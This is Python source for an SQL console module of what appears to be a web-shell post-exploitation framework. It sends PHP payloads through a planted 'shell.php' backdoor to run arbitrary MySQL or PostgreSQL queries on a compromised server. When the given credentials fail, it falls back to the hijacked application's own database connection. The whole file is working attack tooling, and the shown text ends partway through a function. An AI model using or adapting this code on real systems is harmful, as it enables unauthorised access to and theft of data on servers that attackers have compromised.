from core.moduleprobeall import ModuleProbe
from core.moduleexception import ModuleException, ProbeException
from core.vector import VectorList, Vector
from core.savedargparse import SavedArgumentParser as ArgumentParser
from core.prettytable import PrettyTable
import re

WARN_NO_DATA = 'No data returned'
WARN_CHECK_CRED = 'check credentials and dbms availability'
WARN_FALLBACK = 'bad credentials, falling back to default ones'

class Console(ModuleProbe):
    '''Execute SQL queries'''
    
    support_vectors = VectorList([
        Vector('shell.php', 'mysql', ["""if(mysql_connect("$host","$user","$pass")){
$result = mysql_query("$query"); if($result) {
while ($content = mysql_fetch_row($result)) {
foreach($content as $key => $value){echo $value . "|";} echo "\n";}}
mysql_close();}""" ]),
        Vector('shell.php', 'mysql_fallback', [ """$result = mysql_query("$query");
if($result) {
while ($content = mysql_fetch_row($result)) {
foreach($content as $key => $value){echo $value . "|";} echo "\n";}}"""]),
        Vector('shell.php', 'pg', ["""if(pg_connect("host=$host user=$user password=$pass")){
$result = pg_query("$query"); if($result) {
while ($content = pg_fetch_row($result)) {
foreach($content as $key => $value){echo $value . "|";} echo "\n";}}
pg_close();}""" ]),
        Vector('shell.php', 'pg_fallback', [ """$result = pg_query("$query");
if($result) {
while ($content = pg_fetch_row($result)) {
foreach($content as $key => $value){echo $value . "|";} echo "\n";}}
pg_close();"""])
                                            
                                  
    ])
    
    
    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('user', help='SQL username')
    argparser.add_argument('pass', help='SQL password')
    argparser.add_argument('-host', help='DBMS host or host:port', default='127.0.0.1')
    argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
    argparser.add_argument('-query', help='Execute single query')

    def _init_module(self):
        self.stored_args['vector'] = None
        self.stored_args['prompt'] = 'SQL> '
        
    def _query(self, query):
        
        
        
        if self.stored_args['vector']:
            vector = self.stored_args['vector']
        else:
            vector = self.args['dbms']
        
        result = self.support_vectors.get(vector).execute(self.modhandler, { 'host' : self.args['host'], 'user' : self.args['user'], 'pass' : self.args['pass'], 'query' : query })
        
        if not result:
            
            vector = self.args['dbms'] + '_fallback'
            
            result = self.support_vectors.get(vector).execute(self.modhandler, { 'query' : query })
      
            if result:
                
                # First fallback call. Set console
                
                get_current_user = 'SELECT USER;' if self.args['dbms'] == 'postgres' else 'SELECT USER();'
                
                user = self.support_vectors.get(vector).execute(self.modhandler, { 'query' : get_current_user })
                
                if user:
                    user = user[:-1]
                    self.stored_args['prompt'] = '%s SQL> ' % user
                    self.stored_args['vector'] = vector
                    self.mprint('\'%s:%s@%s\' %s: \'%s\'' % (self.args['user'], self.args['pass'], self.args['host'], WARN_FALLBACK, user))
           
                
        elif result and self.stored_args['vector'] == None:
                self.stored_args['prompt'] = "%s@%s SQL> " % (self.args['user'], self.args['host'])
                self.stored_args['vector'] = vector
        
        if result:
            return [ line.split('|') for line in result[:-1].replace('|\n', '\n').split('\n') ]   


        

    def _probe(self):

        self.args['dbms'] = 'pg' if self.args['dbms'] == 'postgres' else 'mysql'

        if not self.args['query']:
            while True:
                self._result = None
                self._output = ''
                
                query  = raw_input( self.stored_args['prompt'] ).strip()
                self._result = self._query(query)
                
                if self._result == None:
                    self.mprint('%s %s' % (WARN_NO_DATA, WARN_CHECK_CRED))
                elif not self._result:
                    self.mprint(WARN_NO_DATA)
                else:
                    self._output_result()
                    
                print self._output
                    
                
        else:
            self._result = self._query(self.args['query'])

            if self._result == None:
                self.mprint('%s %s' % (WARN_NO_DATA, WARN_CHECK_CRED))